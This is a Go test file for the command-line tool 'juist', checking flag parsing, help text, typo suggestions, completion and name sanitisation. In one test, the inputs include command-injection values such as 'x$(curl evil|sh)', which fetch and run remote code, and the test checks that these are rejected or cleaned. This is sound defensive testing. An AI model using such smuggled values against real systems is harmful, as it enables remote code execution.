package main

import (
	"os"
	"slices"
	"strings"
	"testing"
)

func TestFlagsGoAnywhere(t *testing.T) {
	t.Parallel()
	c := newCLI(t)
	var out syncBuffer
	// --home after the command, a flag after the positional argument.
	if err := c.app(&out, "").main([]string{"create", "home", "--home", c.home, "--device", "laptop"}); err != nil {
		t.Fatalf("create: %v\n%s", err, out.String())
	}
	mustContain(t, c.mustRun("devices"), "laptop")
}

func TestUnknownCommandSuggestsOne(t *testing.T) {
	t.Parallel()
	_, err := newCLI(t).run("inivte")
	if err == nil || !strings.Contains(err.Error(), `did you mean "invite"`) {
		t.Fatalf("got %v", err)
	}
}

func TestHelp(t *testing.T) {
	t.Parallel()
	c := newCLI(t)
	out := c.mustRun("help")
	mustContain(t, out, "invite", "join", "remove")
	for _, gone := range []string{"propose", " key "} {
		if strings.Contains(out, gone) {
			t.Errorf("help still lists %q", gone)
		}
	}
	mustContain(t, c.mustRun("invite", "--help"), "Usage: juist invite", "--expires")
	mustContain(t, c.mustRun("help", "join"), "Usage: juist join CODE")
	// The help says what the README and the invite's own hint say.
	mustContain(t, c.mustRun("help", "invite"), "voids the code; the link still works")
	mustContain(t, c.mustRun("help", "publish"), "juist ends TLS")
	mustContain(t, c.mustRun("help", "publish", "add"), "juist ends TLS with")
}

// Options are --name or -n, and actions are commands: nothing else parses.
func TestOptionsHaveOneSpellingAndActionsAreCommands(t *testing.T) {
	t.Parallel()
	c := newCLI(t)
	for _, tc := range []struct {
		args []string
		want string
	}{
		{[]string{"-home", "/tmp/x", "status"}, "as --home"},
		{[]string{"status", "-socket=/tmp/s"}, "as --socket"},
		{[]string{"invite", "-expires", "2h"}, "as --expires"},
		{[]string{"invite", "--expire", "2h"}, "did you mean --expires?"},
		{[]string{"remove", "--y", "x"}, "as -y"},
		{[]string{"--version"}, "use: juist version"},
		{[]string{"-init"}, "did you mean: juist create"},
		{[]string{"-create"}, "did you mean: juist create"},
		{[]string{"rotate", "--identity"}, "unknown option --identity"},
		{[]string{"rotate", "sideways"}, "unknown rotation"},
		{[]string{"grant", "--remove", "a", "relay"}, "unknown option --remove"},
	} {
		_, err := c.run(tc.args...)
		if err == nil || !strings.Contains(err.Error(), tc.want) {
			t.Errorf("juist %q: %v, want %q", tc.args, err, tc.want)
		}
	}
	for _, tc := range []struct {
		args []string
		want string
	}{
		{[]string{"--sock", "/tmp/s", "status"}, "did you mean --socket?"},
		{[]string{"invit"}, `did you mean "invite"?`},
	} {
		_, err := c.run(tc.args...)
		if err == nil || !strings.Contains(err.Error(), tc.want) {
			t.Errorf("juist %q: %v, want %q", tc.args, err, tc.want)
		}
	}
	for _, args := range [][]string{{"help"}, {"help", "rotate"}, {"rotate", "-h"}, {"remove", "--help"}, {"version"},
		{"help", "help"}, {"help", "version"}, {"help", "--help"}, {"version", "--help"}, {"help", "admins", "new"}} {
		if _, err := c.run(args...); err != nil {
			t.Errorf("juist %q: %v", args, err)
		}
	}
}

// Completion offers what the commands define, from the commands themselves.
func TestCompletion(t *testing.T) {
	t.Parallel()
	c := newCLI(t)
	c.mustRun("create", "home", "--device", "laptop")
	for _, tc := range []struct {
		words []string
		want  []string
		not   []string
	}{
		{[]string{"ro"}, []string{"rotate"}, []string{"remove"}},
		{[]string{"rotate", ""}, []string{"identity", "group-secret", "abandon"}, nil},
		{[]string{"invite", "--e"}, []string{"--expires"}, []string{"--yes"}},
		{[]string{"remove", "--"}, []string{"--yes", "--home"}, []string{"-y"}},
		{[]string{"grant", ""}, []string{"laptop"}, nil},
		{[]string{"grant", "laptop", ""}, []string{"relay", "voucher"}, nil},
		{[]string{"admins", ""}, []string{"new", "vouchers"}, nil},
		{[]string{"invite", "--port", ""}, nil, []string{"--port", "laptop"}},
		{[]string{"admins", "remove", ""}, []string{defaultAdminName()}, []string{"remove"}},
		{[]string{"remove", "--home", ""}, nil, []string{"remove", "laptop"}},
		{[]string{"--home", "/tm"}, nil, []string{"create", "status"}},
	} {
		out := c.mustRun(append([]string{"__complete"}, tc.words...)...)
		got := strings.Fields(out)
		for _, w := range tc.want {
			if !slices.Contains(got, w) {
				t.Errorf("%q: %q missing from %q", tc.words, w, got)
			}
		}
		for _, w := range tc.not {
			if slices.Contains(got, w) {
				t.Errorf("%q: %q offered in %q", tc.words, w, got)
			}
		}
	}
}

// A name reaches everyone's terminal and command line, so a new one is held
// to one spelling, and a joining device's proposal is made to fit it.
func TestNamesAreSafeToShowAndToType(t *testing.T) {
	t.Parallel()
	for _, bad := range []string{"x$(curl evil|sh)", "l\u0430ptop", "-rf", "a b", "phone;id"} {
		if checkName("name", bad) == nil {
			t.Errorf("checkName accepted %q", bad)
		}
	}
	for in, want := range map[string]string{
		"x$(curl${IFS}evil|sh)": "x-curl-IFS-evil-sh",
		"laptop.local":          "laptop.local",
		"l\u0430ptop":           "l-ptop",
		"$$$":                   "device",
		"-hidden":               "hidden",
	} {
		if got := memberName(in); got != want || checkName("name", got) != nil {
			t.Errorf("memberName(%q) = %q, want %q", in, got, want)
		}
	}
}

func TestTermWidthUnderWatch(t *testing.T) {
	r, w, err := os.Pipe()
	if err != nil {
		t.Fatal(err)
	}
	defer r.Close()
	defer w.Close()
	columns := "40"
	getenv := func(k string) string { return map[string]string{"COLUMNS": columns}[k] }
	if got := termWidth(w, getenv); got != 40 {
		t.Errorf("termWidth of a pipe with COLUMNS=40 = %d, want 40", got)
	}
	columns = ""
	if got := termWidth(w, getenv); got != 0 {
		t.Errorf("termWidth of a pipe without COLUMNS = %d, want 0", got)
	}
}
